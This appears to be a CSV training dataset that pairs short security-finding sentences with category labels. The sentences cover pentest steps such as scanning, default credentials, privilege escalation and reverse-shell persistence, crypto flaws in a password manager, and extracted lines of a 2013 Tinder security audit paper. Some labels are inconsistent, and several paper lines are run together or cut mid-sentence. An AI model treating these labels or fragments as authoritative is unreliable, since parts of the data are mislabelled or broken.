text,label
Scanned subnet with Nmap and discovered open FTP and SSH ports.,Discovery - Network Reconnaissance
Enumerated SMB shares using smbclient and found accessible shares.,Discovery - Service Enumeration
Login page accepted admin:admin as default credentials.,Misconfiguration - Default Credentials
"Apache server identified as version 2.4.49, vulnerable to CVE-2021-41773.",Vulnerability - Known CVE
MySQL service allowed login with root and no password.,Misconfiguration - Privilege Mismanagement
Used kernel exploit to escalate privileges from user to root.,Exploitation - Privilege Escalation
Set up reverse shell and maintained access using cronjob persistence.,Persistence - Cronjob
"Sent phishing email with payload, user opened link.",Initial Access - Phishing
Lack of MFA and centralized logging in AWS configuration.,Misconfiguration - Insecure Defaults
The salts are generated with Math.random(). This is insecure. Salts must be generated with a CSPRNG.,Crypto Misuse - Weak Salt Generation
Only 100 iterations of PBKDF2 are used when deriving the encryption password. This low value was explicitly chosen for performance reasons.,Crypto Misuse - Weak KDF
The SJCL decrypt() function will throw an exception if the key is wrong or data is tampered. Hash0 does not handle this and crashes.,Error Handling - Insecure Exception Management
The encryption password is derived from the master password with a constant salt.,Design Flaw - Static Salt
The code to prompt the user if they want to migrate always runs due to a logic bug. Not a security issue.,Not Relevant
"If the Storage Provider URL is empty, an empty salt is used without warning.",Design Flaw - Missing Parameter Validation
The HMAC key used during password derivation is a hex-encoded string.,Crypto Misuse - Weak Key Format
"The salt passed to PBKDF2 is a hex string, which is suboptimal.",Crypto Misuse - Nonstandard Salt
"The password is shown to the user before settings are uploaded, allowing reuse in case of failure.",Information Disclosure - UI Exposure
"Due to a race condition, a password could be inserted into the wrong browser tab.",Logic Flaw - TOCTOU
Hash0 could benefit from unit tests of critical functions.,General Risk Observation
Using PBKDF2 then HMAC is unnecessary; better to encode in the PBKDF2 salt directly.,Design Flaw - Redundant Crypto
"Hash0 derives another 'encryption password' from the main password, rather than using a binary key.",Design Flaw - Insecure Key Derivation
Passwordmaker uses charAt() which could be exploited in a side-channel attack.,Discovery - Side Channel Analysis
"Pages could lie about their URL, tricking the app into giving a password to the wrong domain.",Exploitation - Trust Boundary Manipulation
The encryption key is derived from the master key with a fixed salt; more secure design needed.,Design Flaw - Predictable Key Derivation
"The Storage Provider could replay old ciphertext, leading to password reuse or rollback.",Exploitation - Replay Attack
Tinder Security Audit,Background Information
SSN Project 2013,Background Information
Joris Claassen Leendert v. Duijn Mick Pouw Esan Wit,Background Information
"{Joris.Claassen,Leendert.vanDuijn,Mick.Pouw,Esan.Wit}@os3.nl",Background Information
22-Dec-13,Formatting
Abstract,Formatting
Tinder is a dating app that is being used by many users on a global scale. The Tinder application requires a Facebook profile as well as GPS location to function properly. Tinder claims not to share this information with other users. Since personal information like sexual preferences or your location is highly sensitive data it should be properly secured. This audit focuses on testing whether or not Tinder uses avail- able technologies to withstand common attacks. Whilst most known leaks in Tinder appear to no longer be around there are still some points of concern. It turns out that there is an insecure connection which sends user preferences and GPS data to an analytics company. ,Exploitation – Sensitive Data Exposure
Contents,Formatting
1 Introduction 2,Formatting
2 Related Work 3,Formatting
3 Materials and Methods 4,Formatting
3.1 Static analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting
3.2 Network traffic . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting
3.2.1 HTTP(S) Proxies . . . . . . . . . . . . . . . . . . . . . 4,Formatting
3.2.2 Realization . . . . . . . . . . . . . . . . . . . . . . . . 5,Formatting
3.3 User authentication. . . . . . . . . . . . . . . . . . . . . . . . 5,Formatting
4 Analysis 6,Formatting
4.1 Offline analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
4.1.1 Libraries . . . . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
4.1.2 API resources . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting
4.1.3 Local storage . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
4.2 Dynamic analysis . . . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
4.2.1 Secured traffic . . . . . . . . . . . . . . . . . . . . . . 7,Formatting
4.2.2 Insecure traffic . . . . . . . . . . . . . . . . . . . . . . 8,Formatting
4.2.3 Targeting authentication . . . . . . . . . . . . . . . . . 9,Formatting
4.2.4 Replay attacks . . . . . . . . . . . . . . . . . . . . . . 9,Formatting
4.2.5 Data retrieval . . . . . . . . . . . . . . . . . . . . . . . 10,Formatting
4.3 Legal analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
4.3.1 Dutch law . . . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
4.3.2 European law . . . . . . . . . . . . . . . . . . . . . . . 11,Formatting
4.3.3 Privacy concerns . . . . . . . . . . . . . . . . . . . . . 12,Formatting
5 Conclusion 13,Formatting
References 14,Formatting
A Scripts 15,Formatting
A.1 Sending a Tinder message . . . . . . . . . . . . . . . . . . . . 15,Formatting
A.2 Retrieving user history . . . . . . . . . . . . . . . . . . . . . . 15,Formatting
B Traces 15,Formatting
"B.1 Replay, chat message to friend . . . . . . . . . . . . . . . . . 15",Formatting
"B.2 Replay, chat message to stranger . . . . . . . . . . . . . . . . 16",Formatting
C Contributions 18,Formatting
1 Introduction,Formatting
"Dating apps are common place in society. Many dating apps include the option to contact matched users and send text messages or images. Due to the amount of personal information potentially involved in the matchmaking process this a prime target for identity theft. If an app or service deals with personal information, it has to ensure the security of this private information. Since the Tinder application has a lot of users, it would be interesting to check this security.",Background Information
"The user has to supply some information before using the app. This includes a Facebook profile API credentials and eventually even GPS information. The information that can be collected from the Facebook profile could be valuable for eavesdroppers or third parties. Information like GPS, the actual location of the end user.",Background Information
"In this paper we will look in to the risks of using Tinder, what information is sent where and how securely this information is transported over the internet. We also look into whether information is stored at a third party or even Tinder itself. ",Background Information
 We will first discuss the materials and methods we used to research the Tinder application. We will then discuss the analysis we did on the Tinder application. eg. The offline and onlineanalysis. We will discuss certain,Background Information
attacksandpossibleweaknessesoftheTinderimplementation. Wewillthen,Background Information
draw a conclusion based on our results. We divided the research questions into several sub questions. These will be handled in the analysis. The sub,Background Information
control (e.g. client devices)?,Formatting
2 Related Work,Formatting
do this research.,Formatting
ThisresearchislooselybasedonsimilarresearchintotheGrindrapplication[1].,Formatting
on the Grindr application.,Formatting
